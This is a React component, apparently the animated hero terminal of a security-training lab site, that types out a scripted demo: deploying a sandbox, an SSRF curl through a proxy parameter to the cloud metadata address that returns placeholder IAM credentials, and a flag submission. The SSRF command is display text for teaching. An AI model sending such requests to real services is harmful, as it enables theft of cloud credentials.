import { useEffect, useState } from 'react';
import { motion, AnimatePresence, useReducedMotion } from 'framer-motion';
import { Radio } from 'lucide-react';

interface Step {
  label: string;
  command: string;
  output: string;
}

const STEPS: Step[] = [
  {
    label: 'Deploy',
    command: 'xploit lab deploy aws-ssrf-v2 --region eu-west-1',
    output:
      '[ APPROVED ] Initializing ephemeral container sandbox…\n[ CONNECTED ] Target: https://lab-891.sandbox.internal\n[ ISOLATED ] Virtual subnet established: 10.244.12.0/24 (zero-egress)',
  },
  {
    label: 'Exploit',
    command:
      'curl -s "https://lab-891.sandbox.internal/api/proxy?url=http://169.254.169.254/latest/meta-data/"',
    output:
      '{\n  "RoleName": "production-app-role",\n  "AccessKeyId": "ASIA4X7EXAMPLEKEY",\n  "SecretAccessKey": "wJalrXUtnFEMIEXAMPLEKEY",\n  "Token": "IQoJb3JpZ2luX2VjEXAMPLE…"\n}',
  },
  {
    label: 'Verify',
    command: 'xploit flag submit "XP{ssrf_1am_cr3ds_3xf1ltr4t3d}"',
    output:
      '[ CAPTURED ] Flag verified — +250 points awarded.\n[ TEARDOWN ] Sandbox securely wiped. Transient credentials purged.\n[ CONFIRMED ] Skill certified: Cloud Metadata Exfiltration (Tier 2)',
  },
];

// Colour the leading [ TAG ] token by semantic meaning.
const tagColor = (tag: string): string => {
  const t = tag.toUpperCase();
  if (/APPROVED|CAPTURED|CONFIRMED|VERIFIED/.test(t)) return 'text-success';
  if (/CONNECTED|ISOLATED|LISTENING/.test(t)) return 'text-info';
  if (/TEARDOWN|WARN|PURGED/.test(t)) return 'text-warn';
  return 'text-accent';
};

function useTypewriter(text: string, enabled: boolean, speed = 16) {
  const [out, setOut] = useState(enabled ? '' : text);
  useEffect(() => {
    if (!enabled) {
      setOut(text);
      return;
    }
    setOut('');
    let i = 0;
    const id = setInterval(() => {
      i += 1;
      setOut(text.slice(0, i));
      if (i >= text.length) clearInterval(id);
    }, speed);
    return () => clearInterval(id);
  }, [text, enabled, speed]);
  return out;
}

function OutputLine({ line }: { line: string }) {
  const match = line.match(/^(\[[^\]]+\])(.*)$/);
  if (!match) {
    return <div className="text-white/70">{line || '\u00A0'}</div>;
  }
  return (
    <div className="text-white/70">
      <span className={tagColor(match[1])}>{match[1]}</span>
      {match[2]}
    </div>
  );
}

export function HeroTerminal() {
  const reduce = useReducedMotion();
  const [active, setActive] = useState(0);
  const [touched, setTouched] = useState(false);

  // Gentle auto-advance until the user takes control.
  useEffect(() => {
    if (reduce || touched) return;
    const id = setInterval(() => setActive((a) => (a + 1) % STEPS.length), 5400);
    return () => clearInterval(id);
  }, [reduce, touched]);

  const step = STEPS[active];
  const typed = useTypewriter(step.command, !reduce);
  const doneTyping = typed.length >= step.command.length;

  const select = (idx: number) => {
    setTouched(true);
    setActive(idx);
  };

  return (
    <div className="overflow-hidden rounded-xl border border-border bg-bg-raised shadow-pop">
      {/* Title bar */}
      <div className="flex items-center justify-between border-b border-fg/10 bg-bg-overlay px-4 py-3">
        <div className="flex items-center gap-1.5">
          <span className="h-2.5 w-2.5 rounded-full bg-danger/80" />
          <span className="h-2.5 w-2.5 rounded-full bg-warn/80" />
          <span className="h-2.5 w-2.5 rounded-full bg-success/80" />
          <span className="ml-2 hidden font-mono text-[11px] text-fg-subtle sm:inline">
            xploit — zsh
          </span>
        </div>
        <div className="flex items-center gap-1">
          {STEPS.map((s, idx) => (
            <button
              key={s.label}
              type="button"
              onClick={() => select(idx)}
              className={
                'relative rounded-md px-2.5 py-1 text-xs font-medium transition-colors ' +
                (active === idx ? 'bg-bg-terminal text-white' : 'text-fg-muted hover:text-fg')
              }
            >
              {s.label}
            </button>
          ))}
        </div>
      </div>

      {/* Body */}
      <div className="min-h-[280px] bg-bg-terminal p-5 font-mono text-[12.5px] leading-relaxed">
        <AnimatePresence mode="wait">
          <motion.div
            key={active}
            initial={reduce ? false : { opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={reduce ? undefined : { opacity: 0 }}
            transition={{ duration: 0.2 }}
          >
            <div className="flex items-start gap-2">
              <span className="select-none text-accent">❯</span>
              <span className="break-all text-white/90">
                {typed}
                {!doneTyping && (
                  <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 bg-accent" />
                )}
              </span>
            </div>

            <AnimatePresence>
              {doneTyping && (
                <motion.div
                  initial={reduce ? false : { opacity: 0, y: 6 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, ease: [0.2, 0.8, 0.2, 1] }}
                  className="mt-3 space-y-0.5"
                >
                  {step.output.split('\n').map((line, i) => (
                    <OutputLine key={i} line={line} />
                  ))}
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        </AnimatePresence>

        {/* Status bar */}
        <div className="mt-5 flex items-center justify-between border-t border-white/10 pt-3 text-[11px] text-white/50">
          <span className="flex items-center gap-1.5 text-success">
            <Radio className="h-3.5 w-3.5" strokeWidth={1.75} />
            node.status: armed
          </span>
          <span className="flex items-center gap-1.5">
            <motion.span
              className="inline-block h-1.5 w-1.5 rounded-full bg-accent"
              animate={reduce ? undefined : { opacity: [1, 0.25, 1] }}
              transition={{ duration: 1.4, repeat: Infinity, ease: 'easeInOut' }}
            />
            latency · 1.4s
          </span>
        </div>
      </div>
    </div>
  );
}

export default HeroTerminal;
